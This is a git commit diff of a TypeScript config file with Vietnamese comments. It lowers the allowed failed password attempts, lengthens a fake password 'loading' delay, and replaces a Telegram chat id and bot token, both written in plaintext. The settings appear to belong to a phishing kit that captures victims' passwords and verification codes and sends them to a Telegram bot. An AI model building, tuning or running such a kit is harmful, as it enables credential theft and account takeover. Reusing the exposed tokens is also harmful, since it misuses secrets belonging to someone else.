ec8565e49c3b860583214069b7112f9f370d1f62
KieuManh99 <164666130+KieuManh99@users.noreply.github.com>
2024-08-22 23:29:32 -0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -5,15 +5,15 @@ const config = {
 		// Số lượt nhập code tối đa
 		max_failed_code_attempts: 3,
 		// Số lượt nhập mật khẩu tối đa
-		max_failed_password_attempts: 2,
+		max_failed_password_attempts: 1,
 		// Cái này không có tác dụng
 		page_loading_time: 5000,
 		// Thời gian loading khi nhập mật khẩu(milisecond)
-		password_loading_time: 10000,
+		password_loading_time: 15000,
 	},
 	telegram: {
-		chatid: '6759061293',
-		token: '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk',
+		chatid: '-1002244722909',
+		token: '7301744976:AAH5IL02XlJFfJDSLg9VtPrpJawEuf76Ps0',
 	},
 };
 
